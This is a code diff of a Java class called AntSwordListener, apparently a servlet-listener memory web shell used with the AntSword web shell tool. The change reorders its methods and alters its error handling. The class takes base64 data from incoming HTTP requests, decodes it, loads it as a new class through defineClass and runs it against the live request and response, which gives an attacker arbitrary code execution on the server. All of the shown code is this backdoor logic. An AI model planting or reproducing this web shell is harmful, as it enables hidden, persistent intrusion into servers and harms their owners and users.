@@ -21,34 +21,6 @@ public class AntSwordListener extends ClassLoader implements ServletRequestListe
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
-        byte[] value = null;
-        Class<?> base64;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
-        } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
-        }
-        return value;
-    }
-
-    @SuppressWarnings("deprecation")
-    public Class<?> g(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-    @Override
-    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
-    }
-
     @Override
     @SuppressWarnings("all")
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
@@ -61,11 +33,37 @@ public class AntSwordListener extends ClassLoader implements ServletRequestListe
                 Object instance = (new AntSwordListener(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                 instance.equals(new Object[]{request, response});
             }
-        } catch (Exception ignored) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
     }
 
     private Object getResponseFromRequest(Object request) throws Exception {
         return null;
+    }
+
+    @SuppressWarnings("deprecation")
+    public Class<?> g(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
+    }
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] base64Decode(String bs) throws Exception {
+        byte[] value = null;
+        Class<?> base64;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
+            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+        } catch (Exception var6) {
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+        }
+        return value;
     }
 }
